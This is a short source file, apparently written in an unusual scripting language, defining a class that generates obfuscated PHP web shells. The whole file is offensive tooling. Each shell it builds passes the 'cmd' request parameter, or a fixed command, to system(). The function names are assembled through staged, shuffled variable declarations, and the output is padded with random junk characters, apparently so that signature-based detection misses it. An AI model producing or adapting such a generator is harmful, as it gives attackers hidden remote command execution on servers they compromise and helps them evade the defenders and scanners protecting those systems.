from('random', 'shuffle', 'randint');
// Todo:
// Strings
// Everything in array
// Text prefix/suffix
class PhpShellEmitter {
    stages = [ [], [], [], [] ],
    emitter = null,
    prefix = null,
    suffix = null,
    prefixMin = 4,
    prefixMax = 32,
    
    junkChars = 
        range(0x20, 0x7f) 
        @where(@!= '<')
        @select(chr),

    __init__: @{ self.emitter = PhpEmitter() },

    stageDecl: @(stage, value) {
        id, assign = self.emitter.decl_stmt(value);
        self.stages[stage].append(assign);

        ret id;
    },

    varRef: @(stage, name) self.stageDecl(
        stage, 
        '$' + self.stageDecl(stage - 1, self.emitter.string(name, false))),

    emit: @(command=null) {
        self.emitter.chr = self.stageDecl(0, self.emitter.string('chr', false, false));
        system = self.stageDecl(1, self.emitter.string('system', false));

        if (command == null) {
            input = self.varRef(2, '_GET');

            system_call_stmt = self.emitter.call_stmt(
                system, 
                self.emitter.array_access(input, self.emitter.string('cmd', false)));
        } else {
            cmd_str = self.emitter.string(command, false);
            system_call_stmt = self.emitter.call_stmt(system, cmd_str);
		}

        self.stages[3].append(system_call_stmt);

        self.stages @skip(1) @iter(shuffle);
        php = '';

		ret self.stages |> flatten |> addAll |> self.emitter.doc |> self.pad;
	},
    
    emitJunk: @() 
        range(0, randint(self.prefixMin, self.prefixMax))
        @select(@(x) self.junkChars |> choice)
        addAll,
        
    pad: @(value) {
        self.prefix = self.emitJunk();
        self.suffix = self.emitJunk();
        
        ret self.prefix + value + self.suffix;
    },
};